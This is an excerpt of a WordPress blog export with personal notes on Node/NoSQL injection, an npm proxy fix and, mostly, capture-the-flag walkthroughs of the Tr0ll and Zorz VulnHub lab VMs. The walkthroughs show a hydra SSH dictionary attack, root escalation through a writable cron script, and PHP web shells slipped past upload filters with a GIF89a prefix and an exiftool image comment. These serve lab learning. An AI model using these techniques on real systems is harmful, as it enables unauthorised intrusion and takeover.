		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[756]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_6859b230289a960a38d31ade1f52943d</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_bca3a7f40470e032fd3fd4bef209c93f</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>NoSQL - Security Vulns test</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/02/16/nosql-security-vulns-test/</link>
		<pubDate>Tue, 16 Feb 2016 14:25:32 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=772</guid>
		<description></description>
		<content:encoded><![CDATA[1. Encryption/authetication
2. NoSQL-injecctions
https://github.com/tcstool/NoSQLMap
A. eval, setTimeout

<h1>A1 - Injection</h1>
<h2>Server Side JavaScript Injection - SSJI</h2>
- Server Injection 
eval, setTimeout, setInterval
setTimeout och setInterval använder båda eval, därför är de dåliga att använda.

Om man sätter några av dom att tolka user input så ger man i princip total kontroll över ALLT som kan ske på servern. Du kan injecta kod, som du sen kör.
Lösning:
Använd JSON.parse() istället. Mycket säkrare. Eval är snabbare, men galet mycket farligare.

Använd 'use strict'

Att göra: 
a. Kontrollera så att vi aldrig använder ovan nämna funktioner under dessa omständigheter.
b. Använd alltid 'use strict'.

Vidare läsning:
http://arxiv.org/pdf/1506.04082.pdf

2. NoSQL-injection
- MongoDB injection

Lösning: validera/sanitizea all input.

Att göra:
a. Validera/sanitizea all input. 


<h2>A2-Broken Authentication and Session Management</h2>

 
http://arxiv.org/pdf/1506.04082.pdf]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1676</wp:post_id>
		<wp:post_date>2016-02-16 14:25:32</wp:post_date>
		<wp:post_date_gmt>2016-02-16 14:25:32</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>nosql-security-vulns-test</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_oembed_fba0b8d4cb0d920dad498e6b0a8dc218</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[19861147705]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[772]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[772]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_69641995140d0f2be711963e20be4cc7</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>How to use hydra to perform dictionary attacks</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/04/07/how-to-use-hydra-to-perform-dictionary-attacks/</link>
		<pubDate>Thu, 07 Apr 2016 19:30:07 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=608</guid>
		<description></description>
		<content:encoded><![CDATA[So I have been playing around with some vulnerable VMs (from the awesome <a href="https://www.vulnhub.com">vulnhub.com</a>. Some of them have had ftp and ssh services running on them. So I have tried to make dictionary attacks against them.

First we need some dictionaries with passwords. Here is a great <a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords">collection of dictionaries/password-lists</a>

This is the basic syntax. So first we add the list with usernames. Then the list of passwords. Then the ip. Then we specify the port (-s) then the service (in this case ssh). -V is for verbose mode.
The -s is only needed if the service is on another port than the default.
[code]
hydra -L userlist.txt -P best1050.txt 192.168.1.103 -s 45061 ssh -V
[/code]
The man page is really quite useful.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>608</wp:post_id>
		<wp:post_date>2016-04-07 19:30:07</wp:post_date>
		<wp:post_date_gmt>2016-04-07 19:30:07</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>how-to-use-hydra-to-perform-dictionary-attacks</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="hydra"><![CDATA[hydra]]></category>
		<category domain="post_tag" nicename="security"><![CDATA[security]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[21558690705]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Walkthrough Tr0ll VM</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/04/12/walkthrough-tr0ll-vm/</link>
		<pubDate>Tue, 12 Apr 2016 02:22:43 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=621</guid>
		<description></description>
		<content:encoded><![CDATA[This is a walkthrough of the VM Tr0ll. That can be found on <a href="https://www.vulnhub.com/entry/tr0ll-1,100/">vulnhub</a>.

Let's fire up Virtualbox and boot up the VM.

<h2>Mapping</h2>

Let's start by scanning the network to find our server.
[code]
nmap 192.168.1.0/24
[/code]

[code]
Nmap scan report for 192.168.1.107
Host is up (0.0067s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
[/code]

I usually map the machine to a fake-domain address so that Burp Suite will work.

[code]
sudo vim /etc/hosts
192.168.1.107   troll.dev
[/code]

Okay, so we have three ports showing, after an initial scan. Let's try all the ports. To make sure we are not missing anything.
The A-flag stands for aggressive. This flag is a combination of -O (OS-detection), -sV (version scanning), -sC (script scanning), and --traceroute.
-p- means that we will check all 65532 ports.

[code]
nmap -A -p- 192.168.1.107

#Output
Starting Nmap 7.00 ( https://nmap.org ) at 2016-04-11 21:02 CLST
Nmap scan report for troll.dev (192.168.1.107)
Host is up (0.0070s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
|_  256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/secret
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
[/code]

<h3>FTP</h3>
Okay, so we can see that the server is using vsftpd version 3.0.2. Vsftpd is the default ftp-server in many linux-systems. This configuration appears to allow anonymous logins. Which is why we are able to retrieve the file listing of the root directory just by scanning it. So we can see that there is a file called lol.pcap. We will get to this later.

<h3>SSH</h3>
We can also see that port 22 is open, the standard port for SSH. The version seems to be 6.6.1p1, which is not the latest. Then we can see the host-key of ssh.

<h3>HTTP</h3>
Okay so it seems port 80 is open. And it runs Apache 2.4.7, on Ubuntu.
It has a robots.txt file, which might be worth checking out.

Okay, so we have two interesting leads here. We have the file lol.pcap on the ftp-server, and we have port 80. So let's check out the web.
The index-page just gives us a troll-image. I download it and investigate the meta-data of the image. But I find nothing interesting.

[code]
wget http://troll.dev/hacker.jpg
exiftool hacker.jpg
[/code]

Let's check out the robots file.
[code]
User-agent:*
Disallow: /secret
[/code]

It leads us to secret. But that is just another troll image, and with no interesting meta-data.

<h2>lol.pcap</h2>
We log in with the user anonymous and don't need to provide a password.

[code]
ftp 192.168.1.107
Connected to 192.168.1.107.
220 (vsFTPd 3.0.2)
Name (192.168.1.107:comp): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap
226 Directory send OK.
ftp&gt; get lol.pcap
local: lol.pcap remote: lol.pcap
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
226 Transfer complete.
8068 bytes received in 0.00 secs (92693.0 kB/s)
[/code]

Okay. So now we have the .pcap file on the computer. But what is a pcap file?
Pcap stands for "Package Capture". Which means that it is a file filled with packages that has been captured and saved in the file. So we are able to analyze network packages after they have been sent. So in order to make any sense of this file we need a program to open it with. Wireshark is popular to use. But I don't have it on this computer, so instead I use tcpick. Tcpick is just like wireshark, a tcp stream sniffer.

We run the following command. C stands for color. -yP for viewing package in printable characters. and -r to read a file.
[code]
tcpick -C -yP -r lol.pcap
[/code]

Here is the output:

[code]
tcpick: reading from lol.pcap
1      SYN-SENT       10.0.0.12:52449 &gt; 10.0.0.6:ftp
1      SYN-RECEIVED   10.0.0.12:52449 &gt; 10.0.0.6:ftp
1      ESTABLISHED    10.0.0.12:52449 &gt; 10.0.0.6:ftp
220 (vsFTPd 3.0.2)
USER anonymous
331 Please specify the password.
PASS password
230 Login successful.
SYST
215 UNIX Type: L8
PORT 10,0,0,12,173,198
200 PORT command successful. Consider using PASV.
LIST
2      SYN-SENT       10.0.0.6:ftp-data &gt; 10.0.0.12:44486
2      SYN-RECEIVED   10.0.0.6:ftp-data &gt; 10.0.0.12:44486
2      ESTABLISHED    10.0.0.6:ftp-data &gt; 10.0.0.12:44486
150 Here comes the directory listing.
-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt
2      FIN-WAIT-1     10.0.0.6:ftp-data &gt; 10.0.0.12:44486
2      FIN-WAIT-2     10.0.0.6:ftp-data &gt; 10.0.0.12:44486
2      TIME-WAIT      10.0.0.6:ftp-data &gt; 10.0.0.12:44486
2      CLOSED         10.0.0.6:ftp-data &gt; 10.0.0.12:44486
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 10,0,0,12,202,172
200 PORT command successful. Consider using PASV.
RETR secret_stuff.txt
3      SYN-SENT       10.0.0.6:ftp-data &gt; 10.0.0.12:51884
3      SYN-RECEIVED   10.0.0.6:ftp-data &gt; 10.0.0.12:51884
3      ESTABLISHED    10.0.0.6:ftp-data &gt; 10.0.0.12:51884
150 Opening BINARY mode data connection for secret_stuff.txt (147 bytes).
Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P

Sucks, you were so close... gotta TRY HARDER!
3      FIN-WAIT-1     10.0.0.6:ftp-data &gt; 10.0.0.12:51884
3      TIME-WAIT      10.0.0.6:ftp-data &gt; 10.0.0.12:51884
3      CLOSED         10.0.0.6:ftp-data &gt; 10.0.0.12:51884
226 Transfer complete.
TYPE A
200 Switching to ASCII mode.
PORT 10,0,0,12,172,74
200 PORT command successful. Consider using PASV.
LIST
4      SYN-SENT       10.0.0.6:ftp-data &gt; 10.0.0.12:44106
4      SYN-RECEIVED   10.0.0.6:ftp-data &gt; 10.0.0.12:44106
4      ESTABLISHED    10.0.0.6:ftp-data &gt; 10.0.0.12:44106
150 Here comes the directory listing.
-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt
4      FIN-WAIT-1     10.0.0.6:ftp-data &gt; 10.0.0.12:44106
4      TIME-WAIT      10.0.0.6:ftp-data &gt; 10.0.0.12:44106
4      CLOSED         10.0.0.6:ftp-data &gt; 10.0.0.12:44106
226 Directory send OK.
QUIT
221 Goodbye.
1      FIN-WAIT-1     10.0.0.12:52449 &gt; 10.0.0.6:ftp
1      TIME-WAIT      10.0.0.12:52449 &gt; 10.0.0.6:ftp
1      CLOSED         10.0.0.12:52449 &gt; 10.0.0.6:ftp
tcpick: done reading from lol.pcap

67 packets captured
4 tcp sessions detected
[/code]

So we can see here that someone has logged in as anonymous. 
And listed all the files in a directory, and it contains the mysterous file secret_stuff.txt.
It also contains a little message from our troll that talks about a supersecretdir.
[code]
-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt
Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P
[/code]

Okay, so a supersecret directory. Let's check it out in the browser.

Okay, is shows us a directory with a file called roflmao. Let's download it.

[code]
$ file roflmao                                                                                                           
roflmao: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=5e14420eaa59e599c2f508490483d959f3d2cf4f, not stripped
[/code]

Okay. So it is an executable. Let's execute it then
[code]
chmod +x roflmao
./roflmao
#It returns
Find address 0x0856BF to proceed%
[/code]
It looks like a hexadecimal value. But where to use it?
I convert it to decimals using python
[code lang="python"]
print int(&quot;0x0856BF&quot;, 16)
#Output:
546495
[/code]

That number does't really say me anything.

Okay, so I try both decimal and hexadecimal numbers in the browser. http://troll.dev/0x0856BF/ leads me to a directory with a text of what I suppose is passwords.
http://troll.dev/0x0856BF/good_luck/which_one_lol.txt
<pre>
maleus
ps-aux
felux
Eagle11
genphlux &lt; -- Definitely not this one
usmc8892
blawrg
wytshadow
vis1t0r
overflow
</pre>
It could be passwords, or usernames. In the other folder there is a dir called: his_folder_contains_the_password/ with the file Pass.txt in it.

I figure the next step must be ssh. So after trying many different combinations, which was made harder by the fact that the server has some kind of fail2ban mechanism installed, I figured the username was overflow and the password was Pass.txt.

Okay. So we get a shell, but it is a pretty crappy one so I just write bash and it gives me a bash-shell. Great!

<h2>Enumeration and Privilege Escalation</h2>
Okay, so we have a shell and we are in. But after a few minutes we are kicked out. I guess there is a cronjob doing it.
Let's see what other users we have.

[code]
sudo -v
Sorry, user overflow may not run sudo on troll.

cat /etc/passwd
troll:x:1000:1000:Tr0ll,,,:/home/troll:/bin/bash
lololol:x:1001:1001::/home/lololol:
overflow:x:1002:1002::/home/overflow:
ps-aux:x:1003:1003::/home/ps-aux:
maleus:x:1004:1004::/home/maleus:
felux:x:1005:1005::/home/felux:
Eagle11:x:1006:1006::/home/Eagle11:
genphlux:x:1007:1007::/home/genphlux:
usmc8892:x:1008:1008::/home/usmc8892:
blawrg:x:1009:1009::/home/blawrg:
wytshadow:x:1010:1010::/home/wytshadow:
vis1t0r:x:1011:1011::/home/vis1t0r:
[/code]
I have removed all users that are root and system-users. So we are left with 12 users. All part of their own groups.
I can't find out if any of them are sudo users because I don't have permission to view /etc/sudoers. We can also tell that the passwords are encrypted and in the shadow file, that we don't have access to.

Let's look 
[code]
$ find / -writable -type d 2&gt;/dev/null
/tmp
/run/user/1002
/run/shm
/run/lock
/var/tmp
/sys/fs/cgroup/systemd/user/1002.user/10.session
/proc/4981/task/4981/fd
/proc/4981/fd
/proc/4981/map_files
[/code]
Let's see what in /var/tmp.
[code]
overflow@troll:/tmp$ cd /var/tmp
overflow@troll:/var/tmp$ ls
cleaner.py.swp
overflow@troll:/var/tmp$ cat cleaner.py.swp 
crontab for cleaner.py successful

overflow@troll:/var/tmp$ find / -iname cleaner.py 2&gt;/dev/null
/lib/log/cleaner.py

overflow@troll:/lib/log$ cat cleaner.py 
#!/usr/bin/env python
import os
import sys
try:
	os.system('rm -r /tmp/* ')
except:
	sys.exit()
overflow@troll:/lib/log$ 
[/code]

I ran a few other commands as well looking for setuid files. Those commands can be found on <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">this amazing page</a>.

Okay, so we have a file that is owned by root and run as a cron every time I get kicked out. So maybe I can just make myself sudo. 
[code lang="python"]
import os
os.system(&quot;sudo usermod -aG sudo overflow&quot;)
[/code]
Now I just wait for the cronjob to kick me out and run the code.
So I get kicked out and then I just run:
[code]
sudo su
[/code]
And I am root.
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>621</wp:post_id>
		<wp:post_date>2016-04-12 02:22:43</wp:post_date>
		<wp:post_date_gmt>2016-04-12 02:22:43</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>walkthrough-tr0ll-vm</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="ctr"><![CDATA[CTR]]></category>
		<category domain="post_tag" nicename="security"><![CDATA[security]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<category domain="post_tag" nicename="vulnhub"><![CDATA[vulnhub]]></category>
		<category domain="post_tag" nicename="wargames"><![CDATA[wargames]]></category>
		<wp:postmeta>
			<wp:meta_key>_oembed_d049cc1fe9810e5f1e6612ac66fdb7b4</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_a5a6d47c02871c24c0644e59258c42e1</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_87dc03ad71d6dce2e571e96563c61d0d</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[21696128603]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Error handeling Express/NodeJS</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/?p=761</link>
		<pubDate>Mon, 30 Nov -0001 00:00:00 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=761</guid>
		<description></description>
		<content:encoded><![CDATA[The bad part of NodeJS is that is really easy to make it crash. You don't have to be very creative to to find a way to kill a Node-server. Sure, you are probably using forever or pm2 or some other tool to automatically restart the server. But if you want to create a annoying Denial Of Service-attack you can just run a script that crashes the server every few minutes. It just takes one request to do it.

Let's say to are sending a JSON from the client with some input-data from the user. You are probably validating it in the client, and you might even be validating it on the server-side. But that doesn't really help if you have a malicious user the intercepts the request and manipulate the JSON-syntax, so that it becomes incorrect. Just add a comma after the last element in the JSON-object. When the bodyParser-middleware recieves the syntactiaclly incorrect JSON the server will crash. This is just one example of the many ways that the app can crash.

Unless, you handle the error of course. 


[code]
app.use(cookieParser());
app.use(bodyParser.urlencoded({extended: true }));

app.use(function(err,req,res,next){
if(err){
    // console.log(err);
    logger.error(err);
    return res.status(err.status).send(&quot;Something fucked up&quot;);
}
  next();
});

[/code]


https://github.com/expressjs/body-parser/issues/26]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>761</wp:post_id>
		<wp:post_date>2016-04-13 19:09:42</wp:post_date>
		<wp:post_date_gmt>0000-00-00 00:00:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name></wp:post_name>
		<wp:status>draft</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_oembed_224de8b1bfe6682444259ad5344810c4</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_c703dbc2ece688581859f8270b2aa582</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>NPM &quot;network tunneling socket&quot;-error</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/04/14/npm-network-tunneling-socket-error/</link>
		<pubDate>Thu, 14 Apr 2016 14:04:28 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=792</guid>
		<description></description>
		<content:encoded><![CDATA[Sometimes when I have tried to download npm-packages I have received the following error:

[code]
npm ERR! node v4.3.1
npm ERR! npm  v2.14.12
npm ERR! code ECONNRESET

npm ERR! network tunneling socket could not be established, cause=connect ECONNREFUSED 127.0.0.1:8080
npm ERR! network This is most likely not a problem with npm itself
npm ERR! network and is related to network connectivity.
npm ERR! network In most cases you are behind a proxy or have bad network settings.
npm ERR! network 
npm ERR! network If you are behind a proxy, please make sure that the
npm ERR! network 'proxy' config is set properly.  See: 'npm help config'

npm ERR! Please include the following file with any support request:
[/code]

Which is strange since I am not behind a proxy. I am not quite sure what the real issue here is. But I have found that a solution for it is:

[code]
npm config set proxy false
npm cache clean
[/code]

This seems to do the trick for me.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>792</wp:post_id>
		<wp:post_date>2016-04-14 14:04:28</wp:post_date>
		<wp:post_date_gmt>2016-04-14 14:04:28</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>npm-network-tunneling-socket-error</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="error"><![CDATA[error]]></category>
		<category domain="post_tag" nicename="npm"><![CDATA[npm]]></category>
		<category domain="post_tag" nicename="solution"><![CDATA[solution]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[21780839821]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Walkthrough Zorz</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/04/24/walkthrough-zorz/</link>
		<pubDate>Sun, 24 Apr 2016 14:41:58 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=802</guid>
		<description></description>
		<content:encoded><![CDATA[I have been playing around with another vulnerable VM, this one is called Zorz, and can be found <a href="https://www.vulnhub.com/entry/tophatsec-zorz,117/">here</a> on vulnhub. It is made by <a href="https://www.top-hat-sec.com/r4v3ns-blog/another-vm-challenge-zorz">Top-hat-sec</a>.

First I imported the VM, but it automatically used eth0, instead of wlan. So once that was changed I could find the machine when I did my scan.

[code]
nmap -v 192.168.1.1/24
[/code]
I have started running nmap in verbose mode, because it can be fun to see how nmap is working, and especially if it is really slow, and I start to doubt that everything is really working as it should.

[code]
sudo nmap -A -T4 -p- 192.168.1.104
[/code]

So this stands for -A: Aggressive, and it includes: OS detection, version detection, script scanning, and traceroute. 

-T4 is how fast the scanning should be. -T4 is "aggressive", but not -T5 "insane". So it works out fast, but still reliable. Although it doesn't really matter. I think it is more useful when you need to scan hundreds of networks. In how much of a hurry you are. Granted T0 is slooow. -T3 is the default.

[code]
Starting Nmap 7.00 ( https://nmap.org ) at 2016-04-23 21:23 CLST
Nmap scan report for zorz.dev (192.168.1.104)
Host is up (0.0011s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 48:bb:d8:38:b8:25:a6:6c:5e:7f:67:c9:ec:53:cc:ed (DSA)
|   2048 ec:55:48:93:28:90:f6:bf:3c:cd:e3:90:42:26:3b:5d (RSA)
|_  256 3f:0a:11:c9:59:73:be:df:f7:77:59:65:07:91:d7:d6 (ECDSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:9A:0D:2F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS out CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.0
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.08 ms zorz.dev (192.168.1.104)
[/code]

Okay, so we just have ssh and 80. Let's start ZAP and Dir-browsing, because that can take some time. And let that roll while we checkout the browser.

<h2>Challenge 1</h2>
So we find three challenges. Three ways to upload images to the server. So I guess that we want to bypass the image-restrictions and upload shells instead.

The first one was really straight-forward. It didn't really do any check. So I could just upload php-reverse-shell.php without any problems. But where was the file? I continued to play with Challenge 2 and 3. On the third one it says where the file was uploaded. It was uploaded into a dir called uploads3. So I figured the files for challenge 1 and 2 were to be found in uploads1 and uploads 2.

So I opened port 1234 in the firewall with the command:
[code]
ufw allow 1234
[/code]
And then I used netcat to start listening in on that port, and get ready for the shell.
[code]
nc -v -l 1234
[/code]
So -v stands for verbose. -l for listen. So that netcat know that it should listed for a incoming connection, and not establish connection itself. 1234 is the port that it should listen to.
Now we just click on the shell-file in uploads1 and the server connects to netcat.

So year, this was pretty easy. Basically no check whatsoever.

<h2>Challenge 2</h2>

Now it is getting a bit more difficult. We cannot upload file that does not end with .png, .jpg, .gif.

But instead we can just rename our shell and upload it as shell.php.jpg. It passed the filter and the file is executed as php.

<h2>Challenge 3</h3>
This challenge was a bit harder. Because somehow it was checking to see if the file itself was an image. I found to ways to bypass this check.
From this <a href="http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html">great tutorial</a> I learned how to get around it. Basically you just add the text "GIF89a;" before you shell-code. So it would look something like this:

[code lang="php"]
GIF89a;
&lt;?
system($_GET['cmd']);//or you can insert your complete shell code
?&gt;
[/code] 

So that worked and I managed to get a shell up and running. 

The second way to beat this challenge is to add the shell-code into a comment of a image-file.

First I looked for a simple jpg file online "jpg file:jpg". And then I inserted the php-code into the image comment with the following command.

[code]
exiftool -Comment='&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET['cmd']); ?&gt;' lo.jpg 
[/code]

Exiftool is a great tool to view and manipulate exif-data.
Then I had to rename the file
[code]
mv lo.jpg lo.php.jpg
[/code]
Then upload it. When I then click on it the browser just outputs jibberish. 
[code]
http://zorz.dev/uploads1/lo.php.jpg?cmd=ls
[/code]
So when we run this in the browser it outputs the result on the webpage. So yeah, we have a shell.

Then we can move to
http://zorz.dev/uploads1/lo.php.jpg?cmd=cat%20/var/www/html/l337saucel337/SECRETFILE
And see the win-file.

There are many more tricks to bypass fileupload restrictions. Here are some:
https://pentestlab.wordpress.com/2012/11/29/bypassing-file-upload-restrictions/
http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>802</wp:post_id>
